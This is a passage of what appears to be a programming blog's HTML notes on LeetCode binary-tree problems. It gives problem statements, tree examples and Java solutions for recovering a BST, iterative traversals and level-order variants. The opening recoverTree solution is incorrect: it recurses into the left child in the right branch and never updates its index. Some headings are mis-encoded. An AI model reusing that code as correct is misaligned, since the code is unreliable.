class="line">  /</span><br><span class="line"> 1</span><br><span class="line">  \</span><br><span class="line">   2</span><br></pre></td></tr></table></figure><p><strong>Example 2:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Input: [3,1,4,null,null,2]</span><br><span class="line"></span><br><span class="line">  3</span><br><span class="line"> / \</span><br><span class="line">1   4</span><br><span class="line">   /</span><br><span class="line">  2</span><br><span class="line"></span><br><span class="line">Output: [2,1,4,null,null,3]</span><br><span class="line"></span><br><span class="line">  2</span><br><span class="line"> / \</span><br><span class="line">1   4</span><br><span class="line">   /</span><br><span class="line">  3</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">recoverTree</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">       <span class="type">int</span> swap[] = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">2</span>];</span><br><span class="line">       TreeNode[] tree =<span class="keyword">new</span> <span class="title class_">TreeNode</span>[<span class="number">2</span>];</span><br><span class="line">       <span class="type">int</span> index=<span class="number">0</span>;</span><br><span class="line">       dfs(root,swap,index,tree);</span><br><span class="line">       swap(swap,tree);</span><br><span class="line">       System.out.println();</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">swap</span><span class="params">(<span class="type">int</span>[] swap, TreeNode[] tree)</span> &#123;</span><br><span class="line">       tree[<span class="number">0</span>].val = swap[<span class="number">1</span>];</span><br><span class="line">       tree[<span class="number">1</span>].val=swap[<span class="number">0</span>];</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">dfs</span><span class="params">(TreeNode root, <span class="type">int</span>[] swap,<span class="type">int</span> index,TreeNode[] tree)</span>&#123;</span><br><span class="line">       <span class="keyword">if</span>(root==<span class="literal">null</span>)</span><br><span class="line">           <span class="keyword">return</span>;</span><br><span class="line">       <span class="keyword">if</span>(root.left!=<span class="literal">null</span>)&#123;</span><br><span class="line">           <span class="keyword">if</span>(root.val&lt;root.left.val)&#123;</span><br><span class="line">               swap[index]=root.val;</span><br><span class="line">               tree[index]=root;</span><br><span class="line">               index++;</span><br><span class="line">           &#125;</span><br><span class="line">           dfs(root.left,swap,index,tree);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">if</span>(root.right!=<span class="literal">null</span>) &#123;</span><br><span class="line">           <span class="keyword">if</span>(root.val&gt;root.right.val)&#123;</span><br><span class="line">               swap[index]=root.val;</span><br><span class="line">               tree[index]=root;</span><br><span class="line">               index++;</span><br><span class="line">           &#125;</span><br><span class="line">           dfs(root.left,swap,index,tree);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h1><span id="æ ‘çš„éå†å›æº¯">æ ‘çš„éå†ï¼ˆå›æº¯ï¼‰</span></h1><h2><span id="94-binary-tree-inorder-traversal-iteratively">94. Binary Tree Inorder Traversal (Iteratively) Ã—</span></h2><p>Given a binary tree, return the <em>inorder</em> traversal of its nodesâ€™ values.</p><p><strong>Example:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Input: [1,null,2,3]</span><br><span class="line">   1</span><br><span class="line">    \</span><br><span class="line">     2</span><br><span class="line">    /</span><br><span class="line">   3</span><br><span class="line"></span><br><span class="line">Output: [1,3,2]</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title function_">inorderTraversal</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">       List&lt;Integer&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">       Stack&lt;TreeNode&gt; s = <span class="keyword">new</span> <span class="title class_">Stack</span>();</span><br><span class="line">       <span class="keyword">if</span>(root==<span class="literal">null</span>) <span class="keyword">return</span> res;       </span><br><span class="line">       <span class="keyword">while</span>(root!=<span class="literal">null</span>||!s.isEmpty())&#123;</span><br><span class="line">           <span class="keyword">if</span>(root!=<span class="literal">null</span>)&#123;</span><br><span class="line">               s.push(root);</span><br><span class="line">               root=root.left;</span><br><span class="line">           &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">               root=s.pop();</span><br><span class="line">               res.add(root.val);</span><br><span class="line">               root=root.right;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> res;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h2><span id="144-binary-tree-preorder-traversal-iteratively">144. Binary Tree Preorder Traversal (Iteratively) Ã—</span></h2><p>Given a binary tree, return the <em>preorder</em> traversal of its nodesâ€™ values.</p><p><strong>Example:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Input: [1,null,2,3]</span><br><span class="line">   1</span><br><span class="line">    \</span><br><span class="line">     2</span><br><span class="line">    /</span><br><span class="line">   3</span><br><span class="line"></span><br><span class="line">Output: [1,2,3]</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title function_">preorderTraversal</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        List&lt;Integer&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">        Stack&lt;TreeNode&gt; s = <span class="keyword">new</span> <span class="title class_">Stack</span>();</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">null</span>) <span class="keyword">return</span> res;</span><br><span class="line">        s.push(root);</span><br><span class="line">        <span class="keyword">while</span>(!s.isEmpty())&#123;</span><br><span class="line">            <span class="type">TreeNode</span> <span class="variable">tmp</span> <span class="operator">=</span> s.pop();</span><br><span class="line">            res.add(tmp.val);</span><br><span class="line">            <span class="keyword">if</span>(tmp.right!=<span class="literal">null</span>) s.push(tmp.right);</span><br><span class="line">            <span class="keyword">if</span>(tmp.left!=<span class="literal">null</span>) s.push(tmp.left);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2><span id="145-binary-tree-postorder-traversal-iteratively">145. Binary Tree Postorder Traversal (Iteratively) Ã—</span></h2><p>Given a binary tree, return the <em>postorder</em> traversal of its nodesâ€™ values.</p><p><strong>Example:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Input: [1,null,2,3]</span><br><span class="line">   1</span><br><span class="line">    \</span><br><span class="line">     2</span><br><span class="line">    /</span><br><span class="line">   3</span><br><span class="line"></span><br><span class="line">Output: [3,2,1]</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title function_">postorderTraversal</span><span class="params">(TreeNode head)</span> &#123;</span><br><span class="line">        List&lt;Integer&gt; list=<span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Integer&gt;();</span><br><span class="line">       Stack&lt;TreeNode&gt; stack1=<span class="keyword">new</span> <span class="title class_">Stack</span>&lt;TreeNode&gt;();</span><br><span class="line">       Stack&lt;TreeNode&gt; stack2=<span class="keyword">new</span> <span class="title class_">Stack</span>&lt;TreeNode&gt;();</span><br><span class="line">       <span class="keyword">if</span> (head==<span class="literal">null</span>) <span class="keyword">return</span> list;</span><br><span class="line">       stack1.push(head);</span><br><span class="line">       <span class="keyword">while</span>(!stack1.empty()) &#123;</span><br><span class="line">           head=stack1.pop();</span><br><span class="line">           stack2.push(head);</span><br><span class="line">           <span class="keyword">if</span> (head.left!=<span class="literal">null</span>) &#123;</span><br><span class="line">               stack1.push(head.left);</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="keyword">if</span> (head.right!=<span class="literal">null</span>) &#123;</span><br><span class="line">               stack1.push(head.right);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">while</span>(!stack2.empty()) &#123;</span><br><span class="line">           list.add(stack2.pop().val);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> list;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h2><span id="103-binary-tree-zigzag-level-order-traversal">103. Binary Tree Zigzag Level Order Traversal âˆš</span></h2><p>Given a binary tree, return the <em>zigzag level order</em> traversal of its nodesâ€™ values. (ie, from left to right, then right to left for the next level and alternate between).</p><p>For example:<br>Given binary tree <code>[3,9,20,null,null,15,7]</code>,</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  3</span><br><span class="line"> / \</span><br><span class="line">9  20</span><br><span class="line">  /  \</span><br><span class="line"> 15   7</span><br></pre></td></tr></table></figure><p>return its zigzag level order traversal as:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">  [3],</span><br><span class="line">  [20,9],</span><br><span class="line">  [15,7]</span><br><span class="line">]</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; <span class="title function_">zigzagLevelOrder</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(root==<span class="literal">null</span>) <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">    List&lt;List&lt;Integer&gt;&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">    LinkedList&lt;TreeNode&gt; q = <span class="keyword">new</span> <span class="title class_">LinkedList</span>();</span><br><span class="line">    q.add(root);</span><br><span class="line">    <span class="type">int</span> <span class="variable">order</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(!q.isEmpty())&#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> q.size();</span><br><span class="line">        List&lt;Integer&gt; tmp = <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=len-<span class="number">1</span>;i&gt;=<span class="number">0</span>;i--)&#123;</span><br><span class="line">            <span class="type">TreeNode</span> <span class="variable">t</span> <span class="operator">=</span>q.poll();</span><br><span class="line">            <span class="keyword">if</span> (order == -<span class="number">1</span>) &#123;</span><br><span class="line">                tmp.add(<span class="number">0</span>, t.val);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                tmp.add(t.val);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(t.left!=<span class="literal">null</span>) q.offer(t.left);</span><br><span class="line">            <span class="keyword">if</span>(t.right!=<span class="literal">null</span>) q.offer(t.right);</span><br><span class="line">        &#125;</span><br><span class="line">        res.add(tmp);</span><br><span class="line">        order=order*-<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="102-binary-tree-level-order-traversal">102. Binary Tree Level Order Traversal âˆš</span></h2><p>Given a binary tree, return the <em>level order</em> traversal of its nodesâ€™ values. (ie, from left to right, level by level).</p><p>For example:<br>Given binary tree <code>[3,9,20,null,null,15,7]</code>,</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  3</span><br><span class="line"> / \</span><br><span class="line">9  20</span><br><span class="line">  /  \</span><br><span class="line"> 15   7</span><br></pre></td></tr></table></figure><p>return its level order traversal as:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">  [3],</span><br><span class="line">  [9,20],</span><br><span class="line">  [15,7]</span><br><span class="line">]</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; <span class="title function_">levelOrder</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">       <span class="keyword">if</span>(root==<span class="literal">null</span>) <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">       List&lt;List&lt;Integer&gt;&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">       Queue&lt;TreeNode&gt; q = <span class="keyword">new</span> <span class="title class_">LinkedList</span>();</span><br><span class="line">       q.add(root);</span><br><span class="line">       <span class="keyword">while</span>(!q.isEmpty())&#123;</span><br><span class="line">           <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> q.size();</span><br><span class="line">           List&lt;Integer&gt; tmp = <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">           <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;len;i++)&#123;</span><br><span class="line">               <span class="type">TreeNode</span> <span class="variable">t</span> <span class="operator">=</span>q.poll();</span><br><span class="line">               tmp.add(t.val);</span><br><span class="line">               <span class="keyword">if</span>(t.left!=<span class="literal">null</span>) q.offer(t.left);</span><br><span class="line">               <span class="keyword">if</span>(t.right!=<span class="literal">null</span>) q.offer(t.right);</span><br><span class="line">           &#125;</span><br><span class="line">           res.add(tmp);</span><br><span class="line">       &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h2><span id="107-binary-tree-level-order-traversal-ii">107. Binary Tree Level Order Traversal II âˆš</span></h2><p>Given a binary tree, return the <em>bottom-up level order</em> traversal of its nodesâ€™ values. (ie, from left to right, level by level from leaf to root).</p><p>For example:<br>Given binary tree <code>[3,9,20,null,null,15,7]</code>,</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  3</span><br><span class="line"> / \</span><br><span class="line">9  20</span><br><span class="line">  /  \</span><br><span class="line"> 15   7</span><br></pre></td></tr></table></figure><p>return its bottom-up level order traversal as:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">  [15,7],</span><br><span class="line">  [9,20],</span><br><span class="line">  [3]</span><br><span class="line">]</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; <span class="title function_">levelOrderBottom</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">       <span class="keyword">if</span>(root==<span class="literal">null</span>) <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">       List&lt;List&lt;Integer&gt;&gt; ans = <span class="keyword">new</span> <span class="title class_">ArrayList</span>();       </span><br><span class="line">       Queue&lt;TreeNode&gt; q = <span class="keyword">new</span> <span class="title class_">LinkedList</span>();</span><br><span class="line">       q.add(root);</span><br><span class="line">       <span class="keyword">while</span>(!q.isEmpty())&#123;</span><br><span class="line">           <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> q.size();</span><br><span class="line">           List&lt;Integer&gt; t = <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">           <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;len;i++)&#123;</span><br><span class="line">               <span class="type">TreeNode</span> <span class="variable">tmp</span> <span class="operator">=</span> q.poll();</span><br><span class="line">               <span class="type">int</span> <span class="variable">val</span> <span class="operator">=</span> tmp.val;</span><br><span class="line">               t.add(val);</span><br><span class="line">               <span class="keyword">if</span>(tmp.left!=<span class="literal">null</span>) q.offer(tmp.left);</span><br><span class="line">               <span class="keyword">if</span>(tmp.right!=<span class="literal">null</span>) q.offer(tmp.right);</span><br><span class="line">           &#125;</span><br><span class="line">           ans.add(<span class="number">0</span>,<span class="keyword">new</span> <span class="title class_">ArrayList</span>(t));</span><br><span class="line">       &#125;</span><br><span class="line">      </span><br><span class="line">       <span class="keyword">return</span> ans;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h2><span id="637-average-of-levels-in-binary-tree">637. Average of Levels in Binary Tree âˆš</span></h2><p>Given a non-empty binary tree, return the average value of the nodes on each level in the form of an array.</p><p><strong>Example 1:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Input:</span><br><span class="line">    3</span><br><span class="line">   / \</span><br><span class="line">  9  20</span><br><span class="line">    /  \</span><br><span class="line">   15   7</span><br><span class="line">Output: [3, 14.5, 11]</span><br><span class="line">Explanation:</span><br><span class="line">The average value of nodes on level 0 is 3,  on level 1 is 14.5, and on level 2 is 11. Hence return [3, 14.5, 11].</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> List&lt;Double&gt; <span class="title function_">averageOfLevels</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(root==<span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    Queue&lt;TreeNode&gt; q = <span class="keyword">new</span> <span class="title class_">LinkedList</span>();</span><br><span class="line">    List&lt;Double&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">    q.add(root);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(!q.isEmpty())&#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> q.size();</span><br><span class="line">        <span class="type">double</span> val=<span class="number">0.0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;len;i++)&#123;</span><br><span class="line">            <span class="type">TreeNode</span> <span class="variable">tmp</span> <span class="operator">=</span> q.poll();</span><br><span class="line">            val+=tmp.val;</span><br><span class="line">            <span class="keyword">if</span>(tmp.left!=<span class="literal">null</span>) q.offer(tmp.left);</span><br><span class="line">            <span class="keyword">if</span>(tmp.right!=<span class="literal">null</span>) q.offer(tmp.right);</span><br><span class="line">        &#125;</span><br><span class="line">        res.add(val/len);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="515-find-largest-value-in-each-tree-row">515. Find Largest Value in Each Tree Row âˆš</span></h2><p>You need to find the largest value in each row of a binary tree.</p><p><strong>Example:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Input: </span><br><span class="line"></span><br><span class="line">          1</span><br><span class="line">         / \</span><br><span class="line">        3   2</span><br><span class="line">       / \   \  </span><br><span class="line">      5   3   9 </span><br><span class="line"></span><br><span class="line">Output: [1, 3, 9]</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title function_">largestValues</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(root==<span class="literal">null</span>) <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">    List&lt;Integer&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">    Queue&lt;TreeNode&gt; q = <span class="keyword">new</span> <span class="title class_">LinkedList</span>();</span><br><span class="line">    q.add(root);</span><br><span class="line">    <span class="keyword">while</span>(!q.isEmpty())&#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">tmp</span> <span class="operator">=</span> Integer.MIN_VALUE;</span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> q.size();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;len;i++)&#123;</span><br><span class="line">            <span class="type">TreeNode</span> <span class="variable">node</span> <span class="operator">=</span> q.poll();</span><br><span class="line">            tmp = node.val &gt; tmp? node.val:tmp;</span><br><span class="line">            <span class="keyword">if</span>(node.left!=<span class="literal">null</span>) q.offer(node.left);</span><br><span class="line">            <span class="keyword">if</span>(node.right!=<span class="literal">null</span>) q.offer(node.right);</span><br><span class="line">        &#125;</span><br><span class="line">        res.add(tmp);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="513-find-bottom-left-tree-value">513. Find Bottom Left Tree Value âˆš</span></h2><p>Given a binary tree, find the leftmost value in the last row of the tree.</p><p><strong>Example 1:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Input:</span><br><span class="line"></span><br><span class="line">    2</span><br><span class="line">   / \</span><br><span class="line">  1   3</span><br><span class="line"></span><br><span class="line">Output:</span><br><span class="line">1</span><br></pre></td></tr></table></figure><p><strong>Example 2:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Input:</span><br><span class="line"></span><br><span class="line">        1</span><br><span class="line">       / \</span><br><span class="line">      2   3</span><br><span class="line">     /   / \</span><br><span class="line">    4   5   6</span><br><span class="line">       /</span><br><span class="line">      7</span><br><span class="line"></span><br><span class="line">Output:</span><br><span class="line">7</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">findBottomLeftValue</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (root == <span class="literal">null</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    Queue&lt;TreeNode&gt; queue = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">    queue.add(root);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (!queue.isEmpty()) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> queue.size();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; size; i++) &#123;</span><br><span class="line">            <span class="type">TreeNode</span> <span class="variable">node</span> <span class="operator">=</span> queue.poll();</span><br><span class="line">            <span class="keyword">if</span> (i == <span class="number">0</span>) result = node.val;</span><br><span class="line">            <span 